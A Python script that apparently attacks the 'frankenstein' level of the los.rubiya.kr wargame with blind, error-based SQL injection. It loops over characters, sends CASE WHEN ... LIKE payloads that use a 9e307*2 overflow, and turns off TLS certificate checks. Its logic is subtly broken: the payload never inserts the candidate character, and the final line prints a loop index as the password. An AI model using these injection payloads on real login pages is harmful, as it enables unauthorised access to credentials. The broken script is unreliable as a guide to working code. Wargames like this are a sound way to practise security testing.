import requests

requests.packages.urllib3.disable_warnings()
sess = requests.session()
URL = 'https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php'
headers = {'Cookie': ''}
break_flag = True
pw = ''
#?pw=%27||case%20when%20pw%20like%20%270%%27%20then%209e307*2%20else%201%20end%23
pw = '0'
while break_flag:
    for i in range(48, 128):
        #payload = "?pw='||case when id='admin' and pw like '"+pw+"%' then 9e307*2 else 0 end%23"
        payload = "?pw=%27||case%20when%20pw%20like%20%27"+pw+"%%27%20then%209e307*2%20else%201%20end%23"
        res = sess.get(url=URL + payload, headers=headers, verify=False)
        print(res.text)
        if "login_chk" in res.text:
            pass
        else:
            pw = pw + chr(i)
            print(pw)

        if 'FRANKENSTEIN' in res.text:
            break_flag = False

print('pw = {}'.format(i))